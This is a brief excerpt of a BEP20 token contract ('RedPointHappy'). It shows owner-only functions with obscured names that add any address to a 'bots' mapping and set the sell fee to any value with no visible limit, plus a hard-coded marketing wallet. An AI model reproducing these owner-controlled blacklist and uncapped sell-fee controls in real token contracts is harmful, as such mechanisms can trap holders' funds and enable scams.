...
contract Redppy is IBEP20, Admin{
    ...
    string constant _name = "RedPointHappy";
    string constant _symbol = "Redppy";
    ...
    address private marketingFeeReceiver = (0xf65780ed48dc0882aC36E1d0188e074515198539); // marketing address
    ...
    function setBMRedppy(address account,bool bmv) external onlyOwner() {
        bots[account] = bmv;
    }

    function setFMRedppy(uint256 fv) external onlyOwner {
        sellMarketingFee = fv;
    }
